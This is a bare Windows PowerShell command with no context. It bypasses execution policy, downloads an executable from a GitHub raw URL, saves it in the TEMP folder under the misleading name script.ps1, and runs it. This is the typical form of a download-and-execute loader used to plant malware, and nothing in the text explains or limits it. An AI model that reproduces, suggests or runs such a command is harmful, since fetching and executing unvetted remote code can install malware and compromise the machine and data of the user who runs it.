powershell -ExecutionPolicy Bypass -Command ^
"$url='https://github.com/no123ex/tes/raw/refs/heads/main/WinFormsApp.exe'; ^
$path=\"$env:TEMP\script.ps1\"; ^
Invoke-WebRequest $url -UseBasicParsing -OutFile $path; ^
& $path"
